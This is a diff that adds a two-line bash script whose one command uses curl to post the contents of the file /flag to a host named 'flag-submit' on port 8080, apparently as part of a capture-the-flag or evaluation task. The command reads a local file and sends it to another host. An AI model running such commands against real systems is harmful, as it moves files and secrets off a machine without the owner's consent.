@@ -1,0 +1,2 @@
+#!/bin/bash
+curl http://flag-submit:8080 --data @/flag
